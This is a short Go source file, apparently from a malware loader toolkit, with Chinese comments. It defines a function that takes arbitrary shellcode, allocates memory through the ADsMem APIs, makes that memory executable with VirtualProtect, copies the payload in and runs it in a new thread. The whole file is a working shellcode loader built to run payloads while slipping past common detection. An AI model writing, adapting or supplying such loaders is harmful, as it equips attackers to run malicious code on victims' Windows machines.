package loader

import (
	"unsafe"
	"variant/wdll"

	"golang.org/x/sys/windows"
)

func ADsMemLoad(shellcode []byte) {
	// AllocADsMem 分配一个可读可写但不可执行的内存块
	ptrAlloc, _, _ := wdll.AllocADsMem().Call(uintptr(len(shellcode)))

	// ReallocADsMem 将AllocADsMem分配的内存块复制出来
	ptrRealloc, _, _ := wdll.ReallocADsMem().Call(ptrAlloc, uintptr(len(shellcode)), uintptr(len(shellcode)))

	// VirtualProtect 修改内存保护常量为可读可写可执行
	var oldProtect uint32
	wdll.VirtualProtect().Call(
		ptrRealloc,
		uintptr(len(shellcode)),
		0x40,
		uintptr(unsafe.Pointer(&oldProtect)),
		0,
		0)

	wdll.RtlMoveMemory().Call(
		ptrRealloc,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
	)

	handle, _, _ := wdll.CreateThread().Call(0, 0, ptrRealloc, 0, 0, 0)

	wdll.WaitForSingleObject().Call(handle, windows.INFINITE)
}
